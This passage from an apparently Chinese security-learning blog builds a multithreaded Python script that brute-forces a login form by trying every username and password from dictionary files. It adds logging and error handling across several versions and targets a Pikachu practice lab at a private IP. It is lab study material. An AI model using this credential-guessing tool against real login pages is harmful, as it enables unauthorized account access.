class="params">username, password, url, timeout</span>):</span><br><span class="line">    <span class="keyword">if</span> check(url, timeout) != <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> username:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> password:</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&quot;username&quot;</span>: i,</span><br><span class="line">                <span class="string">&quot;password&quot;</span>: j,</span><br><span class="line">                <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;Login&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            r = requests.post(url, data=data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[+]爆破成功：用户名：&quot;</span> + i + <span class="string">&quot;，密码：&quot;</span> + j)</span><br><span class="line">            <span class="comment"># else:</span></span><br><span class="line">            <span class="comment">#     print(&quot;[-]爆破失败：用户名：&quot; + i + &quot;，密码：&quot; + j)</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    start = time.time()</span><br><span class="line">    run(username, password, url, timeout)</span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;time&quot;</span>+<span class="built_in">str</span>(end - start)+<span class="string">&quot;seconds&quot;</span>)</span><br></pre></td></tr></table></figure><p>多线程</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/ python3</span></span><br><span class="line"><span class="comment"># _*_ coding:utf-8 _*_</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件读取</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&#x27;参数功能&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--username&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, metavar=<span class="string">&quot;username.txt&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;指定用户字典&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--password&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, metavar=<span class="string">&quot;username.txt&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;指定密码字典&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--timeout&#x27;</span>, required=<span class="literal">False</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, metavar=<span class="string">&quot;5&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;设置超时时间&quot;</span>, default=<span class="number">5</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line">username = get_data(args.username)</span><br><span class="line">password = get_data(args.password)</span><br><span class="line">timeout = args.timeout</span><br><span class="line"><span class="comment"># print(username)</span></span><br><span class="line"><span class="comment"># print(password)</span></span><br><span class="line">url = <span class="string">&quot;http://192.168.174.160/pikachu/vul/burteforce/bf_form.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 探活</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">url, timeout</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        respone = requests.get(url, timeout=timeout)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;响应状态码：<span class="subst">&#123;respone.status_code&#125;</span> -----&gt; <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> respone.status_code</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;请求失败: <span class="subst">&#123;url&#125;</span>, 错误信息: <span class="subst">&#123;<span class="built_in">type</span>(e).__name__&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 主函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">username, password, url</span>):</span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: username,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: password,</span><br><span class="line">        <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;Login&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url, data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+]爆破成功：用户名：&quot;</span> + username + <span class="string">&quot;，密码：&quot;</span> + password)</span><br><span class="line">    <span class="comment"># else:</span></span><br><span class="line">    <span class="comment">#     print(&quot;[-]爆破失败：用户名：&quot; + i + &quot;，密码：&quot; + j)</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 多线程</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">multi_thread</span>(<span class="params">username, password,url,timeout</span>):</span><br><span class="line">    <span class="keyword">if</span> check(url, timeout) != <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    threads = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> username:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> password:</span><br><span class="line">            threads.append(threading.Thread(target=run, args=(i,j,url,)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">        thread.start()</span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">        thread.join()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;运行结束&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    start = time.time()</span><br><span class="line">    multi_thread(username, password, url, timeout)</span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;time&quot;</span>+<span class="built_in">str</span>(end - start)+<span class="string">&quot;seconds&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="对比"><a href="#对比" class="headerlink" title="对比"></a>对比</h3><h4 id="少量数据"><a href="#少量数据" class="headerlink" title="少量数据"></a>少量数据</h4><p><img src="/../image/image-20240720210135386.png" alt="image-20240720210135386"></p><p><img src="/../image/image-20240720210143724.png" alt="image-20240720210143724"></p><p>可以看到原版还更快</p><h4 id="大量数据"><a href="#大量数据" class="headerlink" title="大量数据"></a>大量数据</h4><p><img src="/../image/image-20240720210224710.png" alt="image-20240720210224710"></p><p><img src="/../image/image-20240720210241091.png" alt="image-20240720210241091"></p><p><img src="/../image/image-20240720212023505.png" alt="image-20240720212023505"></p><p>可以看到数据量大了，多线程的速度快的多，快了快一倍，但测试中也有问题，多线程容易报错，而且一报错就很多报错信息。。。。可能是因为没有上锁导致的安全问题，这个要学的就有点多了。。。果然把BP用好比啥都强。。。</p><h2 id="扩展四：输出日志"><a href="#扩展四：输出日志" class="headerlink" title="扩展四：输出日志"></a>扩展四：输出日志</h2><p><a href="https://blog.csdn.net/chrnhao/article/details/138216601">https://blog.csdn.net/chrnhao/article/details/138216601</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 配置日志记录</span></span><br><span class="line">logging.basicConfig(level=logging.INFO, <span class="built_in">format</span>=<span class="string">&#x27;%(asctime)s - %(levelname)s - %(message)s&#x27;</span>)</span><br><span class="line">logger = logging.getLogger(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建文件处理程序</span></span><br><span class="line">current_time = time.strftime(<span class="string">&#x27;%Y-%m-%d_%H-%M-%S&#x27;</span>, time.localtime())</span><br><span class="line">log_file_name = <span class="string">f&quot;<span class="subst">&#123;current_time&#125;</span>_<span class="subst">&#123;url.replace(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;_&#x27;</span>).replace(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;_&#x27;</span>)&#125;</span>.txt&quot;</span></span><br><span class="line">file_handler = logging.FileHandler(log_file_name, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">file_handler.setLevel(logging.INFO)</span><br><span class="line">file_formatter = logging.Formatter(<span class="string">&#x27;%(asctime)s - %(levelname)s - %(message)s&#x27;</span>)</span><br><span class="line">file_handler.setFormatter(file_formatter)</span><br><span class="line">logger.addHandler(file_handler)</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240720212050200.png" alt="image-20240720212050200"></p><p><img src="/../image/image-20240720212100919.png" alt="image-20240720212100919"></p><p><img src="/../image/image-20240720212122504.png" alt="image-20240720212122504"></p><p><img src="/../image/image-20240720212129319.png" alt="image-20240720212129319"></p><p>可以看到效果还是不错的</p><h2 id="问题修复"><a href="#问题修复" class="headerlink" title="问题修复"></a>问题修复</h2><p><img src="/../image/image-20240720212409948.png" alt="image-20240720212409948"></p><p>可以看到是不同进程之间引起了错误</p><p><img src="/../image/image-20240720212449229.png" alt="image-20240720212449229"></p><p>无法连接，这个我也无法解决</p><h3 id="错误信息太多"><a href="#错误信息太多" class="headerlink" title="错误信息太多"></a>错误信息太多</h3><p>看不过来我们可以提升日志记录的等级为，把error也记录进去</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 配置日志记录</span></span><br><span class="line">logging.basicConfig(level=logging.DEBUG, <span class="built_in">format</span>=<span class="string">&#x27;%(asctime)s - %(levelname)s - %(message)s&#x27;</span>)</span><br><span class="line">logger = logging.getLogger(__name__)</span><br></pre></td></tr></table></figure><p>在查看代码的过程发现，有这么多异常信息是因为run’没有作异常处理</p><p><img src="/../image/image-20240720212620278.png" alt="image-20240720212620278"></p><p>做一下requests的异常处理</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 主函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">username, password, url</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: username,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: password,</span><br><span class="line">            <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;Login&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            logger.info(<span class="string">&quot;[+]爆破成功：用户名：&quot;</span> + username + <span class="string">&quot;，密码：&quot;</span> + password)</span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     logger.info(&quot;[-]爆破失败：用户名：&quot; + i + &quot;，密码：&quot; + j)</span></span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line"></span><br><span class="line">        logger.exception(<span class="string">f&quot;请求失败: <span class="subst">&#123;url&#125;</span>, 错误信息: <span class="subst">&#123;<span class="built_in">type</span>(e).__name__&#125;</span>,测试数据: username:<span class="subst">&#123;username&#125;</span>, password <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="输出复杂（日志就不带url，太长了）"><a href="#输出复杂（日志就不带url，太长了）" class="headerlink" title="输出复杂（日志就不带url，太长了）"></a>输出复杂（日志就不带url，太长了）</h3><p><img src="/../image/image-20240720214659595.png" alt="image-20240720214659595"></p><p>密密麻麻的，不好找，在最后再加一个正确的输出结果，先用一个列表把成功的结果存起来,下面是改完后的完整代码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.174.160/pikachu/vul/burteforce/bf_form.php&quot;</span></span><br><span class="line"><span class="comment"># 配置日志记录</span></span><br><span class="line">logging.basicConfig(level=logging.DEBUG, <span class="built_in">format</span>=<span class="string">&#x27;%(asctime)s - %(levelname)s - %(message)s&#x27;</span>)</span><br><span class="line">logger = logging.getLogger(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建文件处理程序</span></span><br><span class="line">current_time = time.strftime(<span class="string">&#x27;%Y-%m-%d_%H-%M-%S&#x27;</span>, time.localtime())</span><br><span class="line">log_file_name = <span class="string">f&quot;<span class="subst">&#123;current_time&#125;</span>.txt&quot;</span></span><br><span class="line">file_handler = logging.FileHandler(log_file_name, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">file_handler.setLevel(logging.DEBUG)  <span class="comment"># 设置日志级别为 DEBUG</span></span><br><span class="line">file_formatter = logging.Formatter(<span class="string">&#x27;%(asctime)s - %(levelname)s - %(message)s&#x27;</span>)</span><br><span class="line">file_handler.setFormatter(file_formatter)</span><br><span class="line">logger.addHandler(file_handler)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用于存储成功的结果</span></span><br><span class="line">success_results = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件读取</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 控制参数</span></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&#x27;参数功能&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--username&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, metavar=<span class="string">&quot;username.txt&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;指定用户字典&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--password&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, metavar=<span class="string">&quot;username.txt&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;指定密码字典&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--timeout&#x27;</span>, required=<span class="literal">False</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, metavar=<span class="string">&quot;5&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;设置超时时间&quot;</span>, default=<span class="number">5</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line">username = get_data(args.username)</span><br><span class="line">password = get_data(args.password)</span><br><span class="line">timeout = args.timeout</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 探活</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">url, timeout</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url, timeout=timeout)</span><br><span class="line">        logger.info(<span class="string">f&quot;响应状态码：<span class="subst">&#123;response.status_code&#125;</span> -----&gt; <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> response.status_code</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        logger.error(<span class="string">f&quot;请求失败: <span class="subst">&#123;url&#125;</span>, 错误信息: <span class="subst">&#123;<span class="built_in">type</span>(e).__name__&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 主函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">username, password, url</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: username,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: password,</span><br><span class="line">            <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;Login&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            success_results.append(<span class="string">f&quot;[+]爆破成功：用户名：<span class="subst">&#123;username&#125;</span>，密码：<span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">            logger.info(success_results[-<span class="number">1</span>])  <span class="comment"># 记录成功的日志信息</span></span><br><span class="line">         <span class="keyword">else</span>:</span><br><span class="line">             logger.debug(<span class="string">f&quot;[-]爆破失败：用户名：<span class="subst">&#123;username&#125;</span>，密码：<span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        logger.error(<span class="string">f&quot;请求失败: <span class="subst">&#123;url&#125;</span>, 错误信息: <span class="subst">&#123;<span class="built_in">type</span>(e).__name__&#125;</span>, 测试数据: username:<span class="subst">&#123;username&#125;</span>, password <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 多线程</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">multi_thread</span>(<span class="params">username, password, url, timeout</span>):</span><br><span class="line">    <span class="keyword">if</span> check(url, timeout) != <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    threads = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> username:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> password:</span><br><span class="line">            threads.append(threading.Thread(target=run, args=(i, j, url,)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">        thread.start()</span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">        thread.join()</span><br><span class="line"></span><br><span class="line">    logger.info(<span class="string">&quot;运行结束&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输出成功的结果</span></span><br><span class="line">    logger.info(<span class="string">&quot;成功的结果:&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> result <span class="keyword">in</span> success_results:</span><br><span class="line">        logger.info(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    multi_thread(username, password, url, timeout)</span><br></pre></td></tr></table></figure><p>查看运行结果</p><p><img src="/../image/image-20240720214903717.png" alt="image-20240720214903717"></p><p>不错，检查下日志</p><p><img src="/../image/image-20240720214928207.png" alt="image-20240720214928207"></p><p>加上错误原因，省略爆破失败的结果</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.174.160/pikachu/vul/burteforce/bf_form.php&quot;</span></span><br><span class="line"><span class="comment"># 配置日志记录</span></span><br><span class="line">logging.basicConfig(level=logging.DEBUG, <span class="built_in">format</span>=<span class="string">&#x27;%(asctime)s - %(levelname)s - %(message)s&#x27;</span>)</span><br><span class="line">logger = logging.getLogger(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建文件处理程序</span></span><br><span class="line">current_time = time.strftime(<span class="string">&#x27;%Y-%m-%d_%H-%M-%S&#x27;</span>, time.localtime())</span><br><span class="line">log_file_name = <span class="string">f&quot;<span class="subst">&#123;current_time&#125;</span>.txt&quot;</span></span><br><span class="line">file_handler = logging.FileHandler(log_file_name, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">file_handler.setLevel(logging.DEBUG)  <span class="comment"># 设置日志级别为 DEBUG</span></span><br><span class="line">file_formatter = logging.Formatter(<span class="string">&#x27;%(asctime)s - %(levelname)s - %(message)s&#x27;</span>)</span><br><span class="line">file_handler.setFormatter(file_formatter)</span><br><span class="line">logger.addHandler(file_handler)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用于存储成功的结果</span></span><br><span class="line">success_results = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件读取</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 控制参数</span></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&#x27;参数功能&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--username&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, metavar=<span class="string">&quot;username.txt&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;指定用户字典&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--password&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, metavar=<span class="string">&quot;username.txt&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;指定密码字典&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--timeout&#x27;</span>, required=<span class="literal">False</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, metavar=<span class="string">&quot;5&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;设置超时时间&quot;</span>, default=<span class="number">5</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line">username = get_data(args.username)</span><br><span class="line">password = get_data(args.password)</span><br><span class="line">timeout = args.timeout</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 探活</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">url, timeout</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url, timeout=timeout)</span><br><span class="line">        logger.info(<span class="string">f&quot;响应状态码：<span class="subst">&#123;response.status_code&#125;</span> -----&gt; <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> response.status_code</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        logger.error(<span class="string">f&quot;请求失败: <span class="subst">&#123;url&#125;</span>, 错误信息: <span class="subst">&#123;<span class="built_in">type</span>(e).__name__&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 主函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">username, password, url</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: username,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: password,</span><br><span class="line">            <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;Login&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            success_results.append(<span class="string">f&quot;[+]爆破成功：用户名：<span class="subst">&#123;username&#125;</span>，密码：<span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">            logger.info(success_results[-<span class="number">1</span>])  <span class="comment"># 记录成功的日志信息</span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     logger.debug(f&quot;[-]爆破失败：用户名：&#123;username&#125;，密码：&#123;password&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        logger.info(<span class="string">f&quot;请求失败: <span class="subst">&#123;url&#125;</span>, 错误信息: <span class="subst">&#123;<span class="built_in">type</span>(e).__name__&#125;</span>, 测试数据: username:<span class="subst">&#123;username&#125;</span>, password <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 多线程</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">multi_thread</span>(<span class="params">username, password, url, timeout</span>):</span><br><span class="line">    <span class="keyword">if</span> check(url, timeout) != <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    threads = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> username:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> password:</span><br><span class="line">            threads.append(threading.Thread(target=run, args=(i, j, url,)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">        thread.start()</span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">        thread.join()</span><br><span class="line"></span><br><span class="line">    logger.info(<span class="string">&quot;运行结束&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输出成功的结果</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;成功的结果:&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> result <span class="keyword">in</span> success_results:</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    multi_thread(username, password, url, timeout)</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240720215502439.png" alt="image-20240720215502439"></p><p>但还是感觉信息有点不是我想要的，再次调试后，终极版来了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.174.160/pikachu/vul/burteforce/bf_form.php&quot;</span></span><br><span class="line"><span class="comment"># 配置日志记录</span></span><br><span class="line">logging.basicConfig(level=logging.INFO, <span class="built_in">format</span>=<span class="string">&#x27;%(asctime)s - %(levelname)s - %(message)s&#x27;</span>)</span><br><span class="line">logger = logging.getLogger(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建文件处理程序</span></span><br><span class="line">current_time = time.strftime(<span class="string">&#x27;%Y-%m-%d_%H-%M-%S&#x27;</span>, time.localtime())</span><br><span class="line">log_file_name = <span class="string">f&quot;<span class="subst">&#123;current_time&#125;</span>.txt&quot;</span></span><br><span class="line">file_handler = logging.FileHandler(log_file_name, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">file_handler.setLevel(logging.DEBUG)  <span class="comment"># 设置日志级别为 DEBUG</span></span><br><span class="line">file_formatter = logging.Formatter(<span class="string">&#x27;%(asctime)s - %(levelname)s - %(message)s&#x27;</span>)</span><br><span class="line">file_handler.setFormatter(file_formatter)</span><br><span class="line">logger.addHandler(file_handler)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用于存储成功的结果</span></span><br><span class="line">success_results = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件读取</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 控制参数</span></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&#x27;参数功能&#x27;</span>)</span><br><span 